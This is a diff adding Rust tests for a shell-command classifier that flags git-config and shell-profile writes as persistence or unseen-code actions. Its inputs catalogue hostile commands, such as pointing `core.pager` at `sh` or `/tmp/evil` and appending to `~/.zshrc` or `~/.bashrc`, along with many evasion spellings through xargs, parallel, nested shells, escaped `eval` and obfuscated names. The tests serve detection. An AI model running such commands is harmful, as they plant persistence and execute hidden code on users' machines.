+            UnseenCode,
+        ),
+        ("xargs env --split-string=git", UnseenCode),
+        ("env -S'git config' core.pager sh", Persistence),
+        ("env -S 'git config' core.pager sh", Persistence),
+        // Input put into a shell's script, after a separator there too.
+        (
+            "printf 'core.pager sh\\n' | xargs -I% sh -c 'cd . && git config %'",
+            UnseenCode,
+        ),
+        ("xargs -a keys -I% sh -c 'true; git config %'", UnseenCode),
+        ("xargs -I% sh -c 'git % log'", UnseenCode),
+        ("find . -exec sh -c 'cd . && git config {}' \\;", UnseenCode),
+        ("xargs -I% sh -c 'sh -c \"git config %\"'", Persistence),
+        // #1283: with its braces kept, `${!#}` reads as the positional
+        // parameter it is: a `git config` write.
+        ("xargs sh -c 'git config \"${!#}\" x' _", Persistence),
+        ("xargs zsh -c 'git config $argv'", Persistence),
+        // Review round 2: `-i` and bare `--replace` mean `-I {}`; parallel
+        // runs its command words as a shell line; fd groups.
+        (
+            "printf 'core.pager sh\\n' | xargs -i sh -c 'cd . && git config {}'",
+            UnseenCode,
+        ),
+        ("xargs -i sh -c 'cd . && git config {}' < keys", UnseenCode),
+        (
+            "xargs --replace sh -c 'cd . && git config {}' < keys",
+            UnseenCode,
+        ),
+        (
+            "printf 'core.pager\\nsh\\n' | parallel -N2 'cd . && git config'",
+            Persistence,
+        ),
+        ("parallel -N2 'cd . && git config' :::: keys", Persistence),
+        (
+            "printf -- '-c\\ncore.pager=sh\\nlog\\n' | parallel -N3 'true; git'",
+            UnseenCode,
+        ),
+        ("parallel -N2 sh -c 'cd . && git config'", Persistence),
+        ("fd -HX git config", Persistence),
+        ("gxargs git config", Persistence),
+        ("gfind . -exec git {} +", UnseenCode),
+        // Wrappers that take no input words were already judged.
+        ("nice -n 5 git config core.pager sh", Persistence),
+        ("nohup git config -e", Persistence),
+        ("timeout 5 git -c core.pager=sh log", UnseenCode),
+        ("stdbuf -o0 git config --global user.name x", Persistence),
+        ("sudo -u x git -c core.pager=sh log", UnseenCode),
+        ("env -S 'git config core.pager sh'", Persistence),
+    ] {
+        assert_eq!(script(command), Some(want), "{command}");
+    }
+    // Review round 3: a replaced shell's script after options the command
+    // word reading does not follow (any kind asks).
+    for command in [
+        "printf 'core.pager sh\\n' | xargs --replace bash -o pipefail -c 'cd . && git config {}'",
+        "xargs --replace sh -c -e 'cd . && git config {}' < keys",
+        "fd -x bash -o pipefail -c 'cd . && git config {}'",
+        "xargs --replace fish --command 'cd .; git config {}' < keys",
+        "xargs -I% prlimit bash -O extglob -c 'cd . && git config %' < keys",
+        // Review round 4: parallel's other replacement options, fish's
+        // attached code, a shell with no script word.
+        "cat keys | parallel --er X git X core.pager /tmp/evil",
+        "parallel --er X git X core.pager /tmp/evil :::: keys",
+        "parallel --bnr X git X core.pager sh :::: keys",
+        "parallel --rpl 'X s/a//' git X k v :::: keys",
+        "parallel --extensionr X git X a b ::: config.x",
+        "parallel -j 4 --er X git X log ::: a",
+        "parallel --er X sh -c 'git config X'",
+        "xargs -I% fish -c'true; git config %' _ < keys",
+        "xargs -I% fish --command='true; git config %' _ < keys",
+        "xargs -I% fish --comm='true; git config %' _ < keys",
+        "xargs -I% fish -lC'git config %' < keys",
+        "xargs --replace sh -c -e -x",
+        // Review round 5: fish's code after other options' values.
+        "printf 'core.pager sh\\n' | xargs -I% fish -c true -C 'cd .; git config %'",
+        "printf 'core.pager sh\\n' | xargs -I% fish -c true -C'cd .; git config %'",
+        "printf 'core.pager sh\\n' | xargs -I% fish -c true -c 'cd .; git config %'",
+        "xargs -I% fish --init-command 'cd .; git config %' < keys",
+        "xargs -I% fish -d 1 --comm 'cd .; git config %' < keys",
+        // Review round 6: shells one level down in a replaced script.
+        "printf 'core.pager sh\\n' | xargs -I% sh -c \"fish -c true -C 'git config %'\"",
+        "xargs -I% sh -c \"fish -C 'git config %'\" < keys",
+        "parallel \"fish -c true -C 'git config {1} {2}'\" ::: core.pager ::: sh",
+        "xargs -I% sh -c 'prlimit bash -O extglob -c \"git config %\"' < keys",
+    ] {
+        assert!(script(command).is_some(), "{command}");
+    }
+    for command in [
+        "printf x | xargs git log --oneline",
+        "printf x | xargs git config --get user.name",
+        "xargs git config get user.name",
+        "xargs git-config --list",
+        "xargs git-log --oneline",
+        "xargs git status",
+        "xargs -I % git log %",
+        "find . -type d -name .git -execdir git pull \\;",
+        "parallel git log ::: a b",
+        "git config user.name x",
+        "git log \"$@\"",
+        "git config --get \"$1\"",
+        "git config get \"$@\"",
+        "sh -c 'git log \"$1\"' _ x",
+        "xargs sh -c 'git log --oneline'",
+        "find . -type d -name .git -execdir sh -c 'git pull' \\;",
+        "env -S'git log' --oneline",
+        "xargs env -S'git log' --oneline",
+        "parallel 'cd x && git log' ::: a",
+        "parallel -j4 git log ::: a b",
+        "parallel -j 4 -k --tag git log ::: a",
+        "parallel --jobs=4 git log ::: a",
+        // Review round 7: a replaced script without git stays quiet.
+        "printf 'a\\n' | xargs -I% sh -c 'echo %'",
+        "find . -name '*.log' -exec sh -c 'gzip \"$1\"' _ {} \\;",
+        "parallel 'echo {}' ::: a b",
+        "xargs -I% env -S'echo %'",
+        "xargs -I% sh -c \"sh -c 'echo %'\" < keys",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1268: the launcher checks stay linear when launchers, replacement
+/// strings, git words and positional parameters repeat.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1268_checks_are_linear() {
+    for (label, unit) in [
+        ("launchers", "xargs "),
+        ("replacement strings", "-I% "),
+        ("separate replacement strings", "-J x "),
+        ("git words", "git "),
+        ("git config words", "git config "),
+        ("dashed helpers", "git-config "),
+        ("positional parameters", "\"$@\" "),
+        ("finders", "find -exec "),
+        ("split strings", "env -S'git config' "),
+        ("parallel commands", "parallel git "),
+        ("replaced shells", "-i sh -c x "),
+        ("shell options", "sh -x -e "),
+        ("parallel options", "parallel -j 4 --tag "),
+        ("fish options", "-i fish -lc'x' "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let line = format!("xargs {} git log", unit.repeat(400 * scale));
+            let _ = script(&line);
+            let line = format!("xargs git config {} --get", unit.repeat(400 * scale));
+            let _ = script(&line);
+        });
+    }
+}
+
+/// #1269: in a short group of `git config` options, the letters after `f`
+/// (`--file`) or `t` (`--type`) are that option's value, so an `e` among
+/// them opens no editor; one before them still does.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1269_git_config_attached_values_are_not_editor_options() {
+    for command in [
+        "git config -fpager.log user.name marker",
+        "git config -zfe user.name marker",
+        "git config -tbe user.name marker",
+        "git config -lfe",
+        "git-config -fe user.name marker",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+    for command in [
+        "git config -ef x",
+        "git config -zef x",
+        "git config -tbool -e",
+        "git config -ztbool -e",
+        "git config -fx --edit",
+        "git config -fpager.log -e",
+        "git config -ff -e",
+        "git config -zfoof -e",
+        "git config -tf -e",
+        "git config -ze",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::Persistence),
+            "{command}"
+        );
+    }
+}
+
+/// #1283: the word lexer splits quoted text (and unquoted commas), so a
+/// value's text could read as a `git config` option: `--comment 'x --get'`
+/// made a write read as a read, and a quoted `-f` value hid `-e`. git is
+/// also judged on the words as the shell passes them on, and git spelled by
+/// text that reading cannot see fails closed.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1283_quoted_git_config_values_stay_whole() {
+    for command in [
+        "git config --comment 'x --get' core.pager sh",
+        "git config --comment x,--get core.pager sh",
+        "git config --comment \"x --get\" core.pager sh",
+        "git config --comment x\\ --get core.pager sh",
+        "git config --comm '-x --get' core.pager sh",
+        "git config --comment='x --get' core.pager sh",
+        "git config --comment 'x --get' --global user.name x",
+        "git config -f ~/.zshenv --comment x,--null,--get k v",
+        "git config -f ~/.bashrc --comment 'x --get' k v",
+        "git config -f 'l --null user.name' -e",
+        "git config --comment x >--get core.pager sh",
+        "git config 2>/dev/null -e",
+        "git -C 'x config --get' config core.pager sh",
+        "sh -c 'git config --comment \"x --get\" core.pager sh'",
+        "sh -c \"git config --comment 'x --get' core.pager sh\"",
+        "python3 -c \"import os; os.system('git config --comment \\\"x --get\\\" core.pager sh')\"",
+        "printf 'core.pager sh' | xargs git config --comment 'x --get'",
+        // Git spelled by text the quote-aware reading cannot see.
+        "g=git; $g config --comment 'x --get' core.pager sh",
+        "{git,config} --comment 'x --get' core.pager sh",
+        "git${IFS}config --comment 'x --get' core.pager sh",
+        "$(echo git) config --comment 'x --get' core.pager sh",
+        "x=xargs; printf 'core.pager sh' | $x git config --comment 'x --get'",
+        "{git,config} -f ~/.zshenv --comment x,--get k v",
+        // Review 2: a value held in a variable, which the quote-aware
+        // reading cannot know.
+        "k=core.pager; git config --comment 'x --get' \"$k\" sh",
+        "g=--global; git config $g --comment 'x --get' user.name x",
+        "d=~; git config -f \"$d/.zshenv\" --comment x,--get k v",
+        "f=~/.bashrc; git config --file \"$f\" --comment 'x --get' k v",
+        "o=-e; git config -f 'a b' $o",
+        "x=core.pager; git config --comment 'a b' $(echo $x) sh",
+        // Review 2: a loop over the positional parameters, with the value
+        // quoted.
+        "set -- core.pager; for k; do git config --comment 'x --get' \"$k\" sh; done",
+        "sh -c 'for k; do git config --comment \"x --get\" \"$k\" sh; done' _ core.pager",
+        // Review 3: `eval` parses its joined words again; a loop variable
+        // keeps its meaning where the value's quoting takes effect.
+        r"eval git config --comment \'x --get \' core.pager sh",
+        r#"eval git config --comment "'x" --get "'" core.pager sh"#,
+        r#"sh -c 'for k; do eval "git config --comment \"x --get\" \"\$k\" sh"; done' _ core.pager"#,
+        r#"set -- core.pager; for k; do sh -c "git config --comment 'x --get' $k sh"; done"#,
+        // Review 4: a wrapper's folder holds the output file.
+        "env -C ~ git config -f .zshenv --comment x,--get a.b v",
+        "env --chdir \"$HOME\" git config -f .zshenv --comment x,--get a.b v",
+        "D=~; env -C \"$D\" git config -f .zshenv --comment x,--get a.b v",
+        "cd ~ && git config -f .zshenv --comment x,--get a.b v",
+        "pushd ~; git config -f .zshenv --comment x,--get a.b v",
+        "(cd; git config -f .zshenv --comment x,--get a.b v)",
+        "git --git-dir=x -C ~ config -f .zshenv --comment x,--get a.b v",
+        // Review 5: a folder changed through a variable.
+        "D=~; cd \"$D\"; git config -f .zshenv --comment x,--get a.b v",
+        "D=$HOME; pushd \"$D\"; git config -f .zshenv --comment x,--get a.b v",
+        // Review 6: a nested script run in a folder changed through a
+        // variable, or a wrapper's folder, does not know its folder.
+        "D=~; cd \"$D\"; sh -c 'git config -f .zshenv --comment x,--get a.b v'",
+        "D=~; pushd \"$D\"; bash -c 'git config -f .zshenv --comment x,--get a.b v'",
+        "D=~; cd \"$D\"; eval \"git config -f .zshenv --comment 'x --get' a.b v\"",
+        "D=~; cd \"$D\"; parallel 'git config -f .zshenv --comment x,--get a.b v' ::: 1",
+        "D=~; env -C \"$D\" sh -c 'git config -f .zshenv --comment x,--get a.b v'",
+        "env -C ~ sh -c 'git config -f .zshenv --comment x,--get a.b v'",
+        "D=~; cd \"$D\"; sh -c 'echo x >> .zshenv'",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::Persistence),
+            "{command}"
+        );
+    }
+    assert_eq!(
+        kind(&["git", "config", "--comment", "x --get", "core.pager", "sh"]),
+        Some(ProtectedActionKind::Persistence)
+    );
+    // Reviews 1 and 2: git deeper than the quote-aware reading goes (five
+    // `eval "..."` levels) fails closed, however it is spelled.
+    for inner in [
+        "git config --comment \"x --get\" core.pager sh",
+        "g''it config --comment \"x --get\" core.pager sh",
+        "g\\it config --comment \"x --get\" core.pager sh",
+        "\"g\"it config --comment \"x --get\" core.pager sh",
+        "$'\\x67'it config --comment \"x --get\" core.pager sh",
+    ] {
+        let mut line = inner.to_string();
+        for _ in 0..5 {
+            let escaped: String = line
+                .chars()
+                .flat_map(|ch| {
+                    let escape = matches!(ch, '\\' | '"' | '$' | '`');
+                    escape.then_some('\\').into_iter().chain([ch])
+                })
+                .collect();
+            line = format!("eval \"{escaped}\"");
+        }
+        assert!(script(&line).is_some(), "{line}");
+    }
+    for command in [
+        "git config --get core.pager",
+        "git config --file \"$f\" --get core.pager",
+        "git config --comment 'x' --get core.pager",
+        "git config -f 'a b' -l",
+        "git config --get core.pager 2>/dev/null",
+        "git -C /tmp config --get core.pager",
+        "v=me; git config user.name \"$v\"",
+        "eval git config --get core.pager",
+        "D=/tmp; cd \"$D\"; git config -f x --get core.pager",
+        "D=/tmp; cd \"$D\"; sh -c 'git config --get core.pager'",
+        "cd /tmp; sh -c 'git config -f x a.b v'",
+        "env -C /tmp sh -c 'git config --get core.pager'",
+        "eval \"echo hi\"",
+        "v=me; git config --get user.name; echo \"$v\"",
+        "cp a{,.bak} && git config --get core.pager",
+        "sh -c 'git config --get core.pager'",
+        "echo 'git config --get core.pager'",
+        "printf 'user.name' | xargs git config --get",
+        "GIT_DIR=x git config --get core.pager",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1276: launcher spellings and loops over input words the #1268 checks
+/// did not know: `fd --exec=CMD`, `for k;`, `$_`, more shells, and
+/// `env_parallel`, `xjobs`, `rush`, `bfs`.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1276_more_launchers_ask() {
+    use ProtectedActionKind::*;
+    for (command, want) in [
+        ("fd --exec=git config", Persistence),
+        ("fd . --exec=git config", Persistence),
+        ("fd --exec-batch=git config", Persistence),
+        ("fd -xgit config", Persistence),
+        ("fd -Hxgit config", Persistence),
+        ("fd -x=git config", Persistence),
+        ("fd --exec=git config core.pager sh", Persistence),
+        (
+            "xargs sh -c 'for k; do git config \"$k\" sh; done' _",
+            Persistence,
+        ),
+        (
+            "xargs sh -c 'select k; do git config \"$k\" sh; done' _",
+            Persistence,
+        ),
+        ("xargs sh -c 'true; git config $_ sh' _", Persistence),
+        ("xargs sh -c ': \"$@\"; git config ${_} sh' _", Persistence),
+        ("xargs -I% rbash -c 'true && git config %'", UnseenCode),
+        ("xargs -I% oksh -c 'true && git config %'", UnseenCode),
+        ("env_parallel git config", Persistence),
+        ("xjobs git config", Persistence),
+        ("rush 'git config {}'", UnseenCode),
+        ("bfs . -exec git config {} \\;", UnseenCode),
+        // Review 1: a loop over no positional parameters keeps the value
+        // the variable had.
+        ("for HOME; do :; done; echo x >> $HOME/.zshrc", Persistence),
+        ("f=~/.bashrc; for f do :; done; cat p >> $f", Persistence),
+        (
+            "xargs sh -c 'for k; do :; done; for j; do git config \"$j\" sh; done' _",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(script(command), Some(want), "{command}");
+    }
+    for command in [
+        "fd --exec=rustfmt",
+        "fd -e rs -x rustfmt",
+        "fd -e rs --exec=git log",
+        "xargs sh -c 'for k in a b; do echo $k; done' _",
+        "xargs sh -c 'for k; do echo \"$k\"; done' _",
+        "env_parallel echo ::: a",
+        "rbash -c 'echo hi'",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1283/#1276: the new checks stay linear when the words they read repeat.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1283_1276_checks_are_linear() {
+    for (label, unit) in [
+        ("quoted values", "--comment 'x --get' "),
+        ("git config words", "git config "),
+        ("hidden git words", "{git,config} "),
+        ("attached execs", "fd --exec=git "),
+        ("folder flags", "-C a "),
+        ("output files", "-f ~/.x "),
+        ("loops", "for k; "),
+        ("underscores", "$_ "),
+        ("evals", "eval "),
+        ("requoted evals", r"eval \' "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let line = format!("git config {} core.pager sh", unit.repeat(400 * scale));
+            let _ = script(&line);
+            let line = format!("xargs git {} config --get", unit.repeat(400 * scale));
+            let _ = script(&line);
+            let line = format!(
+                "{}git config --comment \\'x --get \\' sh",
+                unit.repeat(400 * scale)
+            );
             let _ = script(&line);
         });
     }
